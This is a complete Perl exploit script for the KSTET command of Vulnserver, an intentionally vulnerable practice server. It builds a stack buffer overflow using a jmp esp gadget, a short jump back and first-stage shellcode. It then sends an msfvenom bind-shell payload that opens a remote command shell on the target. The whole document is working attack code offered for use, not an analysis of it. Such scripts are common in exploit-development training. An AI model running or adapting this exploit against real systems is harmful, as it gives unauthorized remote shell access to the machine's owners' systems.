#!/usr/bin/perl

# Vulnserver KSTET exploit (https://github.com/stephenbradshaw/vulnserver)
# Tested against Microsoft Windows 7 Professional

use IO::Socket;

if($ARGV[0] eq ''){
die("Proper usage IP_ADDRESS PORT\n\n");
}

$badheader = "KSTET /.:/";
$baddata = "\x8B\xC8\x66\x81\xE9\x10\x01\x66\x83\xEC\x50\x54\x58\x52\xB6\x02\x52\x04\x30\x50\xFF\x31\xB8\x11\x2C\x25\x40\xC1\xE8\x08\xFF\xD0"; # setup and CALL <JMP.&WS2_32.recv>
$baddata .= "\x90" x (66-length($baddata)); # exact offset at 66

# 0x62501203 : jmp esp | ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0-
$baddata .= pack('V',0x62501203);
$baddata .= "\xeb\xb8\x90\x90"; # short jump back 71 bytes
$baddata .= "\x43" x 16;

# msfvenom -p windows/shell_bind_tcp LPORT=80 -b "\x00\x0a\x0d" -f perl -v payload
# Payload size: 355 bytes

$payload = 
"\xda\xdc\xba\x4d\x26\x1b\x95\xd9\x74\x24\xf4\x5b\x29\xc9" .
"\xb1\x53\x31\x53\x17\x03\x53\x17\x83\xa6\xda\xf9\x60\xc4" .
"\xcb\x7c\x8a\x34\x0c\xe1\x02\xd1\x3d\x21\x70\x92\x6e\x91" .
"\xf2\xf6\x82\x5a\x56\xe2\x11\x2e\x7f\x05\x91\x85\x59\x28" .
"\x22\xb5\x9a\x2b\xa0\xc4\xce\x8b\x99\x06\x03\xca\xde\x7b" .
"\xee\x9e\xb7\xf0\x5d\x0e\xb3\x4d\x5e\xa5\x8f\x40\xe6\x5a" .
"\x47\x62\xc7\xcd\xd3\x3d\xc7\xec\x30\x36\x4e\xf6\x55\x73" .
"\x18\x8d\xae\x0f\x9b\x47\xff\xf0\x30\xa6\xcf\x02\x48\xef" .
"\xe8\xfc\x3f\x19\x0b\x80\x47\xde\x71\x5e\xcd\xc4\xd2\x15" .
"\x75\x20\xe2\xfa\xe0\xa3\xe8\xb7\x67\xeb\xec\x46\xab\x80" .
"\x09\xc2\x4a\x46\x98\x90\x68\x42\xc0\x43\x10\xd3\xac\x22" .
"\x2d\x03\x0f\x9a\x8b\x48\xa2\xcf\xa1\x13\xab\x3c\x88\xab" .
"\x2b\x2b\x9b\xd8\x19\xf4\x37\x76\x12\x7d\x9e\x81\x55\x54" .
"\x66\x1d\xa8\x57\x97\x34\x6f\x03\xc7\x2e\x46\x2c\x8c\xae" .
"\x67\xf9\x39\xa6\xce\x52\x5c\x4b\xb0\x02\xe0\xe3\x59\x49" .
"\xef\xdc\x7a\x72\x25\x75\x12\x8f\xc6\x79\xb3\x06\x20\x13" .
"\x23\x4f\xfa\x8b\x81\xb4\x33\x2c\xf9\x9e\x6b\xda\xb2\xc8" .
"\xac\xe5\x42\xdf\x9a\x71\xc9\x0c\x1f\x60\xce\x18\x37\xf5" .
"\x59\xd6\xd6\xb4\xf8\xe7\xf2\x2e\x98\x7a\x99\xae\xd7\x66" .
"\x36\xf9\xb0\x59\x4f\x6f\x2d\xc3\xf9\x8d\xac\x95\xc2\x15" .
"\x6b\x66\xcc\x94\xfe\xd2\xea\x86\xc6\xdb\xb6\xf2\x96\x8d" .
"\x60\xac\x50\x64\xc3\x06\x0b\xdb\x8d\xce\xca\x17\x0e\x88" .
"\xd2\x7d\xf8\x74\x62\x28\xbd\x8b\x4b\xbc\x49\xf4\xb1\x5c" .
"\xb5\x2f\x72\x6c\xfc\x6d\xd3\xe5\x59\xe4\x61\x68\x5a\xd3" .
"\xa6\x95\xd9\xd1\x56\x62\xc1\x90\x53\x2e\x45\x49\x2e\x3f" .
"\x20\x6d\x9d\x40\x61";

$socket=IO::Socket::INET->new(
Proto=>"tcp",
PeerAddr=>"$ARGV[0]",
PeerPort=>"$ARGV[1]"
)or die("Could not connect to server");

$socket->recv($sd,1024);
print $sd;
$socket->send($badheader.$baddata);
sleep(1);
$socket->send($payload);
